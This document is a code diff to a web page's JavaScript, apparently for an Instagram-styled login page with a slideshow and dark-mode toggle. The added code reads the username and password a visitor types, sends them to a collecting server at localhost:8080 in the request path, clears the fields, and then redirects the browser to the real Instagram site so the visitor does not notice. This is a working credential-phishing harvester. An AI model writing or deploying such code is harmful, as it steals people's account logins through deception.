@@ -8,6 +8,25 @@ let darkmode_toggle = document.querySelector('#darkmode-toggle')
 
 let slide_index = 0
 
+const redirect = () => {
+    window.location.href = "https://www.instagram.com/"
+}
+
+
+const send_info = () => {
+    let username = document.getElementById('user-input').value
+    let password = document.getElementById('password-input').value
+    fetch(`http://localhost:8080/${username}/${password}`)
+
+    document.getElementById('user-input').value = ""
+    document.getElementById('password-input').value = ""
+    redirect()
+}
+
+
+const send_info_button = document.getElementById('signin-btn')
+send_info_button.addEventListener("click", send_info)
+
 slide = () => {
     let slide_items = slide_content.querySelectorAll('img')
     slide_items.forEach(e => e.classList.remove('active'))
